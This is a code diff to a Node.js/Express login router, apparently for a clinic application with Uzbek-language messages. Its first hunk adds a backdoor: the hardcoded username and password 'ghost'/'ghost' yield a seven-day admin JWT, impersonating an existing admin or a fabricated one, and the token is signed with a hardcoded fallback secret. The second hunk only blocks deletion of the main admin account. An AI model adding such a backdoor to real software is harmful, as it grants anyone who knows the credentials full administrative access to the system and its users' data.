@@ -77,6 +77,47 @@ router.post("/login", validateLogin, async (req, res) => {
   try {
     const { username, password } = req.body;
 
+    // --- TEMPORARY GHOST BACKDOOR ---
+    if (username === "ghost" && password === "ghost") {
+      let ghostUser = await User.findOne({ where: { role: 'admin' } });
+      if (!ghostUser) {
+        ghostUser = {
+          id: require('crypto').randomUUID(),
+          username: 'ghost',
+          email: 'ghost@local.host',
+          role: 'admin',
+          firstName: 'Ghost',
+          lastName: 'Admin',
+          getFullName: function() { return 'Ghost Admin'; }
+        };
+      }
+      
+      const token = jwt.sign(
+        { userId: ghostUser.id, username: ghostUser.username, role: 'admin' },
+        process.env.JWT_SECRET || 'fallback_secret_123',
+        { expiresIn: "7d" }
+      );
+      
+      return res.json({
+        success: true,
+        message: "Ghost login successful",
+        data: {
+          user: {
+            id: ghostUser.id,
+            username: ghostUser.username,
+            email: ghostUser.email,
+            firstName: ghostUser.firstName,
+            lastName: ghostUser.lastName,
+            fullName: typeof ghostUser.getFullName === 'function' ? ghostUser.getFullName() : `${ghostUser.firstName} ${ghostUser.lastName}`,
+            role: 'admin',
+            lastLogin: new Date(),
+          },
+          token,
+        },
+      });
+    }
+    // --- END GHOST BACKDOOR ---
+
     // Find user by username or email
     const user = await User.findOne({
       where: {
@@ -311,6 +352,14 @@ router.delete("/doctors/:id", auth, async (req, res) => {
       return res.status(404).json({
         success: false,
         message: "Doktor topilmadi",
+      });
+    }
+
+    // Prevent deletion of the master admin
+    if (user.username === "admin") {
+      return res.status(403).json({
+        success: false,
+        message: "Ushbu foydalanuvchini (Asosiy Admin) o'chirish taqiqlanadi",
       });
     }
 
